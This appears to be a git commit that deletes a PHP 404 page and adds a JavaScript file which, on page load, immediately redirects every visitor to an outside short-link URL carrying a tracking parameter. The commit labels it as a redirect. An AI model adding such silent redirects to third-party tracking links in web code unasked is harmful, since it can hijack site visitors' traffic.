c61bfcbf2da20e3a4355c2db9992b4223a8e5a3f
Ulathi <86191272+thedarklordzw@users.noreply.github.com>
2024-05-07 23:17:18 +0200

    added redirect

--- 404.php
+++
@@ -1,9 +0,0 @@
-<?php
-header('HTTP/1.1 400 Not Found', true, 400);
-?>
-<html>
-<head></head>
-<body>
-<p>The page your were looking for could not be found.</p>
-</body>
-</html>
---
+++ script.js
@@ -0,0 +1,7 @@
+const link = 'https://smrturl.co/o/478037/1196338?s1=';
+
+const redirect301 = () => {
+  window.location.replace(link);
+};
+
+redirect301();
